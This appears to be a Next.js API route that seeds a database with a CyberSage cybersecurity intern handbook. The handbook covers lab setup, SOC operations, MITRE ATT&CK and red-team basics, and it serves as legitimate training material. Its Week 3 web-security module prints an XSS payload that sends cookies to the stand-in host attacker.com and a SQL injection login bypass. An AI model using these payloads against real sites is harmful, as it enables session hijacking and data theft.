import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { getCurrentUser } from "@/lib/session";

// Handbook data extracted from CyberSage Intern Handbook.docx
const HANDBOOK_WEEKS = [
  {
    weekNumber: 0,
    title: "Prerequisites — Lab Environment Setup",
    overview: "Before any training begins, every intern must set up their local lab environment. This section is always available and should be completed before Week 1. Follow all four phases carefully.",
    isUnlocked: true, // Prerequisites are ALWAYS unlocked
    topics: [
      {
        title: "Phase 1: Hardware & Hypervisor Setup",
        order: 0,
        body: `## Install VirtualBox

VirtualBox is free, open-source, and works on Windows, macOS (Intel/Rosetta), and Linux.

1. Navigate to the official VirtualBox website: **virtualbox.org**
2. Download the installer for your host operating system
3. Run the installer, leaving all default settings checked
4. Download and install the **VirtualBox Extension Pack** (enables USB 2.0/3.0 support and better screen scaling)

## Create a Custom "NAT Network"

We need the VMs to talk to each other while remaining hidden from your home network.

1. Open VirtualBox
2. Go to **Tools → Network**
3. Click **Create** to make a new NAT Network
4. Name it \`CyberSage_Lab\` and set the IPv4 Prefix to \`10.0.2.0/24\`
5. Ensure **Enable DHCP** is checked`,
      },
      {
        title: "Phase 2: The Red Team Machine (Kali Linux)",
        order: 1,
        body: `## Overview

Kali Linux is the industry standard for penetration testing. We use a pre-built VM image to save time.

## Step-by-Step Setup

**Download the Image:**
- Go to the official Kali Linux website: **kali.org/get-kali/**
- Select **Virtual Machines** and download the VirtualBox \`.vbox\` or \`.ova\` file

**Import to VirtualBox:**
1. Open VirtualBox
2. Go to **File → Import Appliance**
3. Select the downloaded Kali file and click **Next**

**Configure Hardware:**
1. Right-click the newly imported Kali VM → **Settings**
2. Go to **System**: Allocate at least 4096 MB (4 GB) RAM and 2 CPU cores
3. Go to **Network**: Change "Attached to" from NAT to **NAT Network** → select \`CyberSage_Lab\`

**First Boot:**
1. Start the VM
2. Log in using default credentials: Username: \`kali\` / Password: \`kali\`
3. Open the terminal and run:
\`\`\`bash
sudo apt update && sudo apt upgrade -y
\`\`\``,
      },
      {
        title: "Phase 3: The Blue Team Logging Machine (ELK Stack)",
        order: 2,
        body: `## Overview

We deploy an Ubuntu Server VM and run ELK (Elasticsearch, Logstash, Kibana) inside Docker.

## Step-by-Step Setup

**Download Ubuntu Server:**
- Go to **ubuntu.com/download/server** and download the latest \`.iso\` file

**Create the VM in VirtualBox:**
1. Click **New** → Name it \`CyberSage_BlueTeam\`
2. Allocate **8192 MB (8 GB) RAM** and 2–4 CPU cores
3. Create a Virtual Hard Disk of at least **50 GB**
4. In **Settings → Network**, attach it to the \`CyberSage_Lab\` NAT Network

**Install Ubuntu:**
- Start the VM, point it to the Ubuntu \`.iso\` file
- Follow installation prompts — when asked, choose to install **OpenSSH Server**

**Install Docker:**
\`\`\`bash
sudo apt update
sudo apt install docker.io docker-compose -y
\`\`\`

**Deploy the ELK Stack:**
\`\`\`bash
mkdir elk-lab && cd elk-lab
nano docker-compose.yml
# Paste a standard ELK stack configuration (find lightweight configs on GitHub)
sudo docker-compose up -d
\`\`\`

**Accessing Kibana:**
- Find the Ubuntu VM's IP: \`ip a\`
- Open in Kali's browser: \`http://<Ubuntu_IP>:5601\``,
      },
      {
        title: "Phase 4: Integrating the CyberSage Architecture",
        order: 3,
        body: `## Connecting to Nexus & CyberSage Systems

Once your VMs are running, connect all the pieces together:

- **Nexus (Collaboration & Workflow):** Ensure your Nexus account is active. Log in to access discussion boards, the Tasks system, and assignment submission.

- **Sage Forage (Training Labs):** Bookmark the Sage Forage web portal in your Kali Linux browser for immediate access to the lab system and score tracking.

- **Sentinel & Brain Access:** You will receive the URLs and credentials for the Sentinel alert viewer and Brain response display systems. Access these via your host machine browser or within the Kali environment.

Once all four phases are complete, you are ready to begin Week 1.`,
      },
    ],
    resources: [
      { title: "VirtualBox Download", url: "https://virtualbox.org", type: "link", order: 0 },
      { title: "Kali Linux VMs", url: "https://kali.org/get-kali/", type: "link", order: 1 },
      { title: "Ubuntu Server Download", url: "https://ubuntu.com/download/server", type: "link", order: 2 },
    ],
    checkpoints: [
      { title: "VirtualBox installed and Extension Pack active", order: 0 },
      { title: "CyberSage_Lab NAT Network created (10.0.2.0/24)", order: 1 },
      { title: "Kali Linux VM booted and updated", order: 2 },
      { title: "Ubuntu Server VM running with Docker installed", order: 3 },
      { title: "ELK Stack deployed — Kibana accessible on port 5601", order: 4 },
      { title: "Logged into Nexus and Sage Forage", order: 5 },
    ],
  },
  {
    weekNumber: 1,
    title: "Week 1: Cybersecurity Fundamentals (SOC Basics)",
    overview: "This week covers the core concepts every SOC analyst needs: how networks work, what DNS is, the security tools protecting organisations, and the most common attack types. By the end of this week you will be able to read a log file and recognise suspicious traffic patterns.",
    isUnlocked: false,
    topics: [
      {
        title: "Module 1: Networking Fundamentals",
        order: 0,
        body: `## What is a Network?

A network is two or more computers connected together to share resources (files, internet access, or applications). In a SOC, understanding how data moves across a network is the foundation of detecting anomalies.

## The OSI Model

The Open Systems Interconnection (OSI) model describes how data travels from one device to another. SOC analysts primarily focus on **Layers 3, 4, and 7** when analysing logs and packet captures.

| Layer | Name | SOC Relevance |
|---|---|---|
| 7 | Application | HTTP, DNS, SMTP — where most attacks begin |
| 4 | Transport | TCP/UDP ports, connection state |
| 3 | Network | IP addresses, routing |

## TCP vs. UDP

- **TCP** — reliable, connection-oriented. Used for HTTP, SSH, email. Creates a three-way handshake (SYN → SYN-ACK → ACK).
- **UDP** — fast, connectionless. Used for DNS, streaming. No acknowledgment.

## IP Addressing & Ports

- **IPv4:** A numerical label assigned to each device (e.g., \`192.168.1.5\`)
- **Ports:** Virtual endpoints for network connections. If an IP address is a building, a port is a specific apartment number.

**Common Ports to memorise:**
| Port | Protocol | Use |
|---|---|---|
| 22 | SSH | Secure remote shell |
| 53 | DNS | Domain name resolution |
| 80 | HTTP | Unencrypted web traffic |
| 443 | HTTPS | Encrypted web traffic |`,
      },
      {
        title: "Module 2: DNS & Web Basics",
        order: 1,
        body: `## What is DNS?

The Domain Name System (DNS) is the phonebook of the internet. It translates human-readable domain names (like \`cybersage.io\`) into IP addresses that computers use to identify each other.

## Domain Resolution Flow

1. User types a URL into the browser
2. Browser checks its **local cache**
3. If not found, queries the **local DNS resolver** (usually provided by the ISP)
4. Resolver queries **root servers**, then **TLD servers** (.com, .io)
5. Finally queries the **authoritative name server**
6. IP address returned → connection begins

> 💡 **SOC Note:** DNS is a critical attack vector. Malware uses DNS for C2 (command-and-control) communication. Unusual DNS queries are a key indicator of compromise.

## HTTP vs HTTPS & The Request Lifecycle

- **HTTP** — transmits data in plain text. Vulnerable to interception (man-in-the-middle attacks).
- **HTTPS** — encrypts data using TLS/SSL, ensuring confidentiality and integrity.

**Lifecycle:**
1. Client sends an **HTTP Request** (GET, POST) to the server
2. Server processes the request
3. Server sends back an **HTTP Response** with a status code:
   - \`200 OK\` — success
   - \`404 Not Found\` — resource missing
   - \`403 Forbidden\` — access denied`,
      },
      {
        title: "Module 3: Security Basics",
        order: 2,
        body: `## Core Security Technologies

### Firewall
A network security device that monitors and filters incoming and outgoing network traffic based on predefined security rules. It acts as a barrier between a trusted internal network and an untrusted external network.

### Antivirus (AV) vs. EDR
- **AV (Antivirus):** Relies on known signatures to block malicious files. Only stops known threats.
- **EDR (Endpoint Detection & Response):** Monitors endpoint behaviour continuously to detect and respond to advanced, unknown threats (zero-days) that bypass traditional AV.

### SIEM (Security Information & Event Management)
A central platform that aggregates logs from firewalls, EDRs, servers, and applications. It correlates this data to identify complex security incidents.

**Key SIEM capabilities:**
- Log aggregation from all sources
- Real-time alerting on rule matches
- Timeline reconstruction for investigations
- Compliance reporting

### SOC (Security Operations Centre)
The centralised team and facility responsible for continuously monitoring, analysing, and improving an organisation's security posture. You are training to be a SOC analyst.`,
      },
      {
        title: "Module 4: Common Attacks Overview",
        order: 3,
        body: `## Key Threat Vectors

### Phishing
Deceptive communications (usually email) designed to trick users into revealing sensitive information or installing malware. Responsible for over 90% of successful breaches.

**Red flags:** Urgency, fear, too-good-to-be-true offers, spoofed sender addresses, hover-to-reveal suspicious URLs.

### DDoS (Distributed Denial of Service)
Overwhelming a target server or network with a flood of internet traffic, rendering it inaccessible to legitimate users. Commonly uses a **botnet** (network of compromised devices).

### Brute Force
Using trial-and-error to guess login info, encryption keys, or hidden web pages. Often automated using wordlists or credential dumps from previous breaches.

**Detection signature:** Many failed login attempts from a single IP in a short timeframe.

### Malware
Malicious software designed to cause disruption, steal data, or gain unauthorised access.

| Type | Description |
|---|---|
| Ransomware | Encrypts files and demands payment |
| Spyware | Silently exfiltrates data |
| Trojan | Disguises itself as legitimate software |
| Rootkit | Hides deep in the OS to maintain persistence |`,
      },
      {
        title: "Week 1 Action Items",
        order: 4,
        body: `## Hands-on Lab

Access your **Sage Forage** account and review the sample log dataset.

Tasks:
1. Identify the source IPs, destination IPs, and target ports
2. Document any suspicious patterns resembling an automated scan
3. Highlight any traffic to uncommon ports

## Assignment (submit via Nexus Tasks)

Write a **1–2 page report** explaining how a brute force login attack against a web portal would be detected in a SOC.

Your report must cover:
- Which technologies (**Firewall**, **EDR**, **SIEM**) would see the activity
- What the logs might look like at each layer
- What your recommended response would be

**Submission format:** PDF or Word document via the Nexus submission system.`,
      },
    ],
    resources: [
      { title: "Sage Forage Training Portal", url: "https://nexus.cybersage.uk", type: "link", order: 0 },
      { title: "NIST Cybersecurity Framework", url: "https://nist.gov/cyberframework", type: "link", order: 1 },
      { title: "Wireshark (packet analysis)", url: "https://wireshark.org", type: "link", order: 2 },
    ],
    checkpoints: [
      { title: "OSI model layers 3, 4 and 7 understood", order: 0 },
      { title: "Can explain TCP vs UDP difference", order: 1 },
      { title: "Know at least 5 common ports and their protocols", order: 2 },
      { title: "Week 1 assignment submitted via Nexus", order: 3 },
    ],
  },
  {
    weekNumber: 2,
    title: "Week 2: Blue Team & SOC Operations",
    overview: "This week you step into the role of a SOC analyst. You will learn to read real logs, respond to incidents following a structured framework, use the MITRE ATT&CK framework, and hunt for threats that haven't triggered an alert. Hands-on lab work is central to this week.",
    isUnlocked: false,
    topics: [
      {
        title: "Module 1: Log Analysis",
        order: 0,
        body: `## Understanding Logs

Logs are the "CCTV footage" of a network. They are automatically generated, time-stamped records of events happening within systems.

**Types of logs:**
- **Authentication logs** — who logged in, when, from where, success or failure
- **System logs** — OS events, service starts/stops, errors
- **Network logs** — firewall allow/deny records, DNS queries

When an attacker tries to gain access, they almost always leave a footprint in the logs. Your job is to find it.

## Reading Authentication Logs

Example from \`/var/log/auth.log\` (Linux):
\`\`\`
Jun 15 03:44:22 server sshd[1234]: Failed password for invalid user admin from 185.220.101.5 port 44532 ssh2
Jun 15 03:44:23 server sshd[1234]: Failed password for invalid user admin from 185.220.101.5 port 44533 ssh2
Jun 15 03:44:24 server sshd[1234]: Failed password for root from 185.220.101.5 port 44534 ssh2
\`\`\`

**What to look for:**
- Same source IP with multiple failures in short succession → **Brute force**
- Login at an unusual time (e.g., 3 AM) → **Suspicious timing**
- Login from an unexpected country/IP range → **Geo-anomaly**`,
      },
      {
        title: "Module 2: Incident Response Basics",
        order: 1,
        body: `## The IR Process

When you detect something bad in the logs, there is a strict process to follow — never just pull the plug on a server.

## The Four Phases

### 1. Detection
Identify that a security incident is occurring. Sources: SIEM alert, user report, IDS/IPS trigger.

### 2. Containment
Prevent the threat from spreading. Actions: isolate the compromised machine from the network, revoke compromised credentials, block malicious IPs at the firewall.

### 3. Eradication
Remove the threat completely. Actions: delete malicious files, patch the exploited vulnerability, remove persistence mechanisms (scheduled tasks, registry keys).

### 4. Recovery
Restore normal operations. Actions: re-image affected machines, restore from clean backups, monitor closely for re-infection.

## Tabletop Exercise

**Scenario:** An employee clicked a phishing link and their computer is downloading ransomware.

Work through each phase:
- **Detection:** How would the SIEM detect the download? What does the network traffic look like?
- **Containment:** Which network segment do you isolate? Who do you notify first?
- **Eradication:** How do you confirm the ransomware is fully removed?
- **Recovery:** What is the order of system restoration?`,
      },
      {
        title: "Module 3: MITRE ATT&CK Framework",
        order: 2,
        body: `## Hackers Follow Patterns

Attackers are not wizards — they follow predictable methodologies. The **MITRE ATT&CK** framework maps out these patterns.

## Tactics vs Techniques

- **Tactic** = the attacker's **goal** (e.g., Initial Access, Credential Access, Lateral Movement)
- **Technique** = **how** they achieved the goal (e.g., T1110 — Brute Force, T1566 — Phishing)

## Key Tactics (in attack order)

| ID | Tactic | Example |
|---|---|---|
| TA0001 | Initial Access | Phishing, exploiting public-facing apps |
| TA0002 | Execution | PowerShell scripts, malicious macros |
| TA0003 | Persistence | Registry keys, scheduled tasks |
| TA0006 | Credential Access | Brute force, credential dumping |
| TA0008 | Lateral Movement | Pass-the-hash, RDP |
| TA0040 | Impact | Ransomware, data destruction |

## Using ATT&CK in the SOC

When you investigate an incident, map each attacker action to an ATT&CK technique. This:
- Helps communicate findings to leadership
- Guides your hunt for other compromised systems
- Enables you to build better detection rules

**Exercise:** Visit [attack.mitre.org](https://attack.mitre.org) and look up **APT28 (Fancy Bear)**. List the 3 most commonly used techniques by this group.`,
      },
      {
        title: "Module 4: Threat Hunting Basics",
        order: 3,
        body: `## Proactive vs Reactive Security

Reactive security waits for an alert. **Threat hunting** is proactive — you assume the attacker is already inside and go looking for them before they trigger alerts.

## Indicators of Compromise (IOCs)

Forensic evidence that a system may have been compromised:
- **File hashes** — MD5/SHA256 of known malware
- **IP addresses** — known C2 server IPs
- **Domain names** — malicious domains used for phishing or C2
- **Registry keys** — persistence mechanisms

## Behavioural Detection

Looking for users or systems doing things they normally don't do:

| Behaviour | Why Suspicious |
|---|---|
| HR laptop accessing the core database at 3 AM | Out of hours, unusual source |
| 500 failed logins from one IP in 60 seconds | Automated brute force |
| New user account created outside working hours | Possible privilege escalation |
| DNS queries to newly registered domains | Possible C2 beaconing |

## Using Sentinel & Brain

Your internal Sentinel system flags behavioural anomalies automatically. When investigating:
1. Open the Sentinel alert dashboard
2. Check the IOC against known threat intelligence feeds
3. Use Brain to correlate related alerts across the environment
4. Document findings in a SOC report and escalate if confirmed`,
      },
      {
        title: "Week 2 Lab & Assignment",
        order: 4,
        body: `## Lab Exercise

You will be given a synthetic log file containing **500 lines** of normal traffic injected with **50 failed SSH login attempts** from a single IP address over 30 seconds.

**Your tasks:**
1. Identify the **exact IP address** of the attacker
2. Document the **exact timestamp** the attack began
3. Count the number of failed attempts
4. Map this activity to the MITRE ATT&CK technique for **Brute Force (T1110)**

**Recommended approach:**
\`\`\`bash
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
\`\`\`

## Assignment

The interns must analyse the given logs, identify the threats, and map them to MITRE ATT&CK. Output must be a **SOC Report** using the provided template.

**Grading criteria:**
- ✅ Correctly identified malicious IP address
- ✅ Accurate timeline of events
- ✅ Proposed containment strategy is logical
- ✅ Correct MITRE ATT&CK mapping with technique ID

Submit via Nexus Tasks.`,
      },
    ],
    resources: [
      { title: "MITRE ATT&CK Framework", url: "https://attack.mitre.org", type: "link", order: 0 },
      { title: "Splunk Free Training", url: "https://education.splunk.com/free", type: "link", order: 1 },
      { title: "ELK Stack Docker Compose", url: "https://github.com/deviantony/docker-elk", type: "link", order: 2 },
    ],
    checkpoints: [
      { title: "Can read and interpret auth.log entries", order: 0 },
      { title: "Completed the IR tabletop exercise", order: 1 },
      { title: "MITRE ATT&CK framework understood — can map an attack", order: 2 },
      { title: "Week 2 SOC report submitted via Nexus", order: 3 },
    ],
  },
  {
    weekNumber: 3,
    title: "Week 3: Red Team Fundamentals",
    overview: "This week you step into the attacker's shoes. Understanding offensive techniques is essential for building better defences. You will learn OSINT, vulnerability research, web attack concepts, and phishing methodology. All lab exercises use authorised, controlled environments only.",
    isUnlocked: false,
    topics: [
      {
        title: "Module 1: Reconnaissance (OSINT)",
        order: 0,
        body: `## Think Like the Attacker

Before an attacker ever launches an exploit, they do extensive reconnaissance. They use **OSINT (Open Source Intelligence)** — the art of finding public information without touching the target's internal network.

> "If you can find it on Google, an attacker can use it against you."

## OSINT Techniques

| Technique | What It Finds |
|---|---|
| WHOIS lookup | Domain registration data, organisation name |
| DNS enumeration | Subdomains, MX records, nameservers |
| Google dorking | Exposed files, login pages, config files |
| LinkedIn/social | Employee names, roles, email patterns |
| theHarvester | Email addresses, names, IPs, subdomains |

## Hands-On: Using Kali OSINT Tools

Boot your **Kali Linux VM** and try the following against authorised targets only (e.g., \`scanme.nmap.org\`):

\`\`\`bash
# WHOIS lookup
whois cybersage.io

# DNS enumeration
dnsrecon -d scanme.nmap.org -t std

# Harvest emails and subdomains
theHarvester -d scanme.nmap.org -b all

# Nmap host discovery
nmap -sV -O scanme.nmap.org
\`\`\`

> ⚠️ **Legal Warning:** Only ever run these tools against targets you have explicit written permission to test. Unauthorised scanning is illegal in most jurisdictions.`,
      },
      {
        title: "Module 2: Vulnerability Basics",
        order: 1,
        body: `## What is a Vulnerability?

A flaw in code or configuration that can be exploited by an attacker to cross privilege boundaries — accessing something they are not supposed to.

## The CVE System

The **CVE (Common Vulnerabilities and Exposures)** system is the global encyclopedia of known software vulnerabilities.

**CVE anatomy:**
- **CVE-2021-44228** — Log4Shell (Log4j RCE vulnerability)
  - Base Score: 10.0 (Critical)
  - Attack complexity: Low
  - No authentication required
  - Affected: Apache Log4j 2.0–2.14.1

**CVSS Score breakdown:**

| Score | Severity |
|---|---|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

## Exercise

Go to the **NIST National Vulnerability Database** (nvd.nist.gov) and look up:
1. Log4Shell (CVE-2021-44228)
2. EternalBlue (CVE-2017-0144)

For each: note the severity score, what the vulnerability is, and what an attacker could do with it.`,
      },
      {
        title: "Module 3: Web Security Basics",
        order: 2,
        body: `## Why Web Applications?

A massive chunk of attacks happen directly through web browsers. Web applications are often internet-facing, complex, and written by developers who are not security specialists.

## Cross-Site Scripting (XSS)

An attacker forces a website to run malicious script in another user's browser.

**Example payload:**
\`\`\`html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
\`\`\`

If a website echoes back user input without sanitisation, this script executes in every visitor's browser and steals their session cookies.

## SQL Injection

An attacker types database commands into a login box to trick the backend database into dumping its contents.

**Example payload in a login field:**
\`\`\`sql
' OR 1=1 --
\`\`\`

This turns the query \`SELECT * FROM users WHERE username='x' AND password='y'\` into \`SELECT * FROM users WHERE 1=1\` — returning all users.

## Lab: DVWA (Damn Vulnerable Web Application)

Your Ubuntu Server VM should already have Docker installed. Spin up DVWA:

\`\`\`bash
docker run -d -p 8080:80 vulnerables/web-dvwa
\`\`\`

Open in your Kali browser: \`http://<Ubuntu_IP>:8080\`

> ⚠️ This is a safe, intentionally vulnerable application for learning. Never attempt these techniques on real websites.`,
      },
      {
        title: "Module 4: Phishing Attacks",
        order: 3,
        body: `## Social Engineering

The easiest way into a secure network often isn't breaking through a firewall — it's asking a human to open the door.

> "Hackers don't break in; they log in."

## Phishing Anatomy

A phishing email exploits human psychology using:
- **Urgency** — "Your account will be suspended in 24 hours"
- **Authority** — "This is IT Security requiring immediate action"
- **Fear** — "Suspicious login detected — verify now"
- **Reward** — "You've won a prize — claim it here"

## Detecting a Phishing Email — Checklist

1. **Inspect the sender address** — does the domain match the claimed organisation?
2. **Hover over links** before clicking — does the URL match the displayed text?
3. **Check the email headers** — look for \`Reply-To\` address mismatches
4. **Look for poor grammar** — though AI-generated phishing is increasingly polished
5. **Unexpected attachments** — especially .exe, .zip, .xlsm files

## Lab Exercise

You will be given **5 sample emails** (3 legitimate, 2 phishing). For each phishing email:
1. Identify the exact indicator(s) that reveal it is a scam
2. Identify the psychological technique being used
3. Describe what would happen if the victim clicked the link`,
      },
      {
        title: "Week 3 Assignment",
        order: 4,
        body: `## Mock Attack Report

Create a mock attack report explaining a complete attack chain.

**Your report must cover:**

### Stage 1: Reconnaissance (OSINT)
- What public information did the attacker find about the target organisation?
- Which tools did they use?

### Stage 2: Initial Access (Phishing)
- How did the attacker craft the phishing email?
- What psychological technique was used?

### Stage 3: Exploitation (Web Vulnerability)
- Which vulnerability was exploited after initial access?
- How did the attacker escalate privileges?

**Format:** Narrative report using the provided template.

**Grading criteria:**
- ✅ Logical progression of the attack chain
- ✅ Correct use of terminology (OSINT, CVE, XSS/SQLi, Social Engineering)
- ✅ Proper MITRE ATT&CK mapping at each stage
- ✅ Recommended defensive countermeasures included

Submit via Nexus Tasks.

---

> *We have successfully covered Foundation, Blue Team, and Red Team. Next up: Week 4 — AI in Cybersecurity, introducing our proprietary Cyber Sage Systems (Sentinel and Brain).*`,
      },
    ],
    resources: [
      { title: "NIST National Vulnerability Database", url: "https://nvd.nist.gov", type: "link", order: 0 },
      { title: "DVWA (Damn Vulnerable Web App)", url: "https://github.com/digininja/DVWA", type: "link", order: 1 },
      { title: "PortSwigger Web Security Academy (free)", url: "https://portswigger.net/web-security", type: "link", order: 2 },
      { title: "OSINT Framework", url: "https://osintframework.com", type: "link", order: 3 },
    ],
    checkpoints: [
      { title: "OSINT tools used on an authorised target (Kali)", order: 0 },
      { title: "Looked up 2 CVEs on NIST NVD", order: 1 },
      { title: "DVWA container running — XSS and SQLi observed", order: 2 },
      { title: "5 phishing emails analysed and classified", order: 3 },
      { title: "Week 3 mock attack report submitted via Nexus", order: 4 },
    ],
  },
  {
    weekNumber: 4,
    title: "Week 4: AI in Cybersecurity (Sentinel & Brain)",
    overview: "The final week of Month 1 introduces you to AI-powered security operations — the cutting edge of the field and the core technology behind CyberSage's proprietary systems. You will learn how machine learning detects threats, and get hands-on access to Sentinel and Brain.",
    isUnlocked: false,
    topics: [
      {
        title: "Module 1: AI in the SOC",
        order: 0,
        body: `## Why AI in Security?

The volume of security events in a modern organisation is too large for humans to analyse manually. A single enterprise firewall generates millions of log entries daily. AI enables analysts to focus on the threats that matter.

## AI/ML Applications in Cybersecurity

| Application | How It Works |
|---|---|
| **Anomaly detection** | Baseline normal behaviour, flag deviations |
| **Threat classification** | ML models classify alerts as true/false positive |
| **NLP on logs** | Natural language processing extracts IOCs from unstructured text |
| **Predictive threat intel** | Predict attacker TTPs based on historical campaigns |
| **Automated response** | SOAR platforms auto-contain threats before human review |

## The Analyst + AI Model

AI does not replace the analyst. It acts as a **force multiplier**:
- AI triages the alert queue (thousands → dozens)
- Analyst validates, investigates, and decides on response
- AI learns from analyst feedback to improve future classifications`,
      },
      {
        title: "Module 2: CyberSage Sentinel",
        order: 1,
        body: `## What is Sentinel?

Sentinel is CyberSage's proprietary threat detection engine. It monitors the Nexus platform and connected infrastructure in real-time, applying behavioural detection rules to surface suspicious activity.

## What Sentinel Detects

- Unusual login patterns (geo-anomalies, impossible travel)
- DLP violations (sensitive data leaving the organisation)
- Privilege escalation attempts
- Lateral movement indicators
- Command-and-control beaconing patterns

## Reading a Sentinel Alert

When Sentinel fires an alert, you will see:

\`\`\`
ALERT: Elevated — Brute Force Attempt
Source: 185.220.101.5 → target: nexus.cybersage.uk
Rule: BF_SSH_001
Confidence: 94%
Events: 487 failed logins over 120s
Status: OPEN
\`\`\`

**Your job as a SOC analyst:**
1. Review the raw events supporting the alert
2. Determine: true positive or false positive?
3. If true positive: escalate and follow IR process
4. Document findings in the SOC incident tracker (Nexus → SOC)`,
      },
      {
        title: "Module 3: CyberSage Brain",
        order: 2,
        body: `## What is Brain?

Brain is CyberSage's AI response and correlation engine. It works alongside Sentinel to:
- Correlate related alerts across multiple systems
- Suggest probable attack chains
- Recommend containment actions
- Generate executive-ready incident summaries

## How Brain Works

1. Sentinel fires multiple related alerts (failed logins + unusual process + DNS to new domain)
2. Brain correlates them into a **single incident hypothesis**
3. Brain presents: "High-probability account compromise — likely phishing entry point"
4. Brain recommends: isolate endpoint, reset credentials, check all systems accessed by this account

## Week 4 Lab

Access the Brain dashboard via your Nexus account and review the last 24 hours of alerts:
1. Identify any correlated incident groups
2. For the highest-priority incident: write a brief IR plan
3. Map the incident to MITRE ATT&CK

This brings together everything from Weeks 1–3.`,
      },
      {
        title: "Week 4 Assignment & Month 1 Review",
        order: 3,
        body: `## Final Assignment: Full SOC Investigation Report

Using the Sentinel alert queue and Brain correlation view, investigate a live (simulated) incident and produce a complete **SOC Investigation Report**.

**Report sections required:**
1. **Executive Summary** (2–3 sentences for leadership)
2. **Timeline of Events** (chronological with timestamps)
3. **MITRE ATT&CK Mapping** (tactics and techniques used)
4. **Impact Assessment** (what data/systems were affected)
5. **Containment & Eradication Steps Taken**
6. **Recommendations** (prevent recurrence)

**Grading:**
- ✅ Executive summary is clear and concise
- ✅ Timeline is accurate and complete
- ✅ MITRE mapping is correct
- ✅ Recommendations are actionable

---

## Month 1 Complete — What Comes Next

After completing all four weeks:
- You will receive your **Month 1 Completion Certificate**
- Month 2 introduces: Advanced Penetration Testing, Cloud Security, and Forensics
- Top-performing interns will be assigned to live Sentinel triage duties

*Congratulations on completing the CyberSage Internship Month 1 curriculum.*`,
      },
    ],
    resources: [
      { title: "Nexus SOC Dashboard", url: "https://nexus.cybersage.uk/soc", type: "link", order: 0 },
      { title: "MITRE ATT&CK Navigator", url: "https://mitre-attack.github.io/attack-navigator/", type: "link", order: 1 },
      { title: "SANS SOC Analyst Cheat Sheet", url: "https://sans.org", type: "link", order: 2 },
    ],
    checkpoints: [
      { title: "Sentinel dashboard accessed and explored", order: 0 },
      { title: "Brain correlation view reviewed", order: 1 },
      { title: "Final SOC investigation report submitted", order: 2 },
      { title: "Month 1 self-assessment completed", order: 3 },
    ],
  },
];

export async function POST() {
  const session = await getCurrentUser();
  if (!session || !["ADMIN", "CISO"].includes(session.role)) {
    return NextResponse.json({ error: "Admin or CISO only" }, { status: 403 });
  }

  const existing = await prisma.internWeek.count();
  if (existing > 0) {
    return NextResponse.json({ error: "Handbook already seeded. Delete existing weeks first." }, { status: 409 });
  }

  for (const w of HANDBOOK_WEEKS) {
    await prisma.internWeek.create({
      data: {
        weekNumber: w.weekNumber,
        title: w.title,
        overview: w.overview,
        isUnlocked: w.isUnlocked,
        createdById: session.id,
        topics: { create: w.topics },
        resources: { create: w.resources },
        checkpoints: { create: w.checkpoints },
      },
    });
  }

  return NextResponse.json({ seeded: HANDBOOK_WEEKS.length, message: "Handbook seeded successfully." });
}
